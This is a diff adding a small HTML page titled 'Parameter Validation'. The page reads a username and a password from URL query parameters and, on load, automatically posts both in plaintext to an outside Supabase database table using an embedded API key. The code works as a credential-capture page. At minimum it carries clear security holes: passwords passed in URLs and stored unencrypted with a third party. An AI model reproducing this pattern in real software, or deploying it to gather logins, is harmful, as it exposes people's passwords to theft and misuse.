@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="referrer" content="no-referrer">
+  <title>Parameter Validation</title>
+  <style>
+    body { margin: 0; padding: 24px; background: #f5f7fa; color: #243047; font: 16px/1.6 system-ui, sans-serif; }
+    main { max-width: 480px; margin: 10vh auto; padding: 32px; border-radius: 12px; background: white; box-shadow: 0 8px 32px #24304712; }
+    h1 { margin-top: 0; font-size: 24px; }
+    dt { margin-top: 16px; font-weight: 600; }
+    dd { margin: 4px 0 0; overflow-wrap: anywhere; }
+    #status { padding: 12px; border-radius: 6px; background: #eef2f7; }
+  </style>
+</head>
+<body>
+  <main>
+    <h1>Parameter Validation</h1>
+    <p id="status" role="status">Reading parameters…</p>
+    <dl>
+      <dt>user_name</dt>
+      <dd id="user-name">Not provided</dd>
+      <dt>passwd</dt>
+      <dd id="password">Not provided</dd>
+    </dl>
+    <noscript>Please enable JavaScript to read the URL parameters.</noscript>
+  </main>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const userName = params.get('user_name');
+    const password = params.get('passwd');
+    const missing = [];
+
+    if (userName === null || userName.trim() === '') missing.push('user_name');
+    if (password === null || password === '') missing.push('passwd');
+
+    document.getElementById('user-name').textContent = userName || 'Not provided';
+    document.getElementById('password').textContent = password ? '•••••••• (Received)' : 'Not provided';
+    document.getElementById('status').textContent = missing.length
+      ? 'Missing or empty parameters: ' + missing.join(', ')
+      : 'Saving parameters…';
+
+    async function saveParameters() {
+      const status = document.getElementById('status');
+      try {
+        const response = await fetch('https://roqhljmvcjbvieaebaef.supabase.co/rest/v1/test_records', {
+          method: 'POST',
+          headers: {
+            apikey: 'sb_publishable_oXg14rDZAtRMw7o4opRu9Q_A6FtSO7W',
+            'Content-Type': 'application/json',
+            Prefer: 'return=minimal'
+          },
+          body: JSON.stringify({ user_name: userName, passwd: password })
+        });
+
+        if (!response.ok) {
+          status.textContent = 'Failed to save parameters (HTTP ' + response.status + ').';
+          return;
+        }
+
+        status.textContent = 'Parameters saved successfully.';
+      } catch (error) {
+        status.textContent = 'Unable to connect. Please try again later.';
+      }
+    }
+
+    if (missing.length === 0) saveParameters();
+  </script>
+</body>
+</html>
